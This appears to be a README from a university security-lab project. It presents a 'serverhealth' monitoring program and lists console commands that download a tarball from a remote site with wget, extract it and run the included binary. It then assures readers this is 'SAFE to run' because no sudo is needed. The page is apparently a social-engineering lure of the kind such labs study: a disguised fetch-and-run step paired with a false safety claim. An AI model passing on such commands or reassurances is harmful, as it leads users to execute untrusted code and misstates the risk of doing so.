cs460-project-serverhealth
==========================

From blog post: http://serverhealth.azurewebsites.net/?p=101


Please refer to CS 460 Project Report.pdf for detail instruction.

This post is made as a part of University of Illinois – Urbana Champaign CS 460 Security Lab Project. I have disabled search engine indexing, and if you are not one of teaching staffs please disregard this post.

You can simply monitor your server’s status with this simple program.


Run following commands on your server machine console:


wget http://serverhealth.azurewebsites.net/wp-content/uploads/2014/05/serverhealth.tar.gz

tar -xf serverhealth.tar.gz

cd serverhealth

./serverhealth


This is all. It doesn’t even require “sudo” command, so it is SAFE to run!
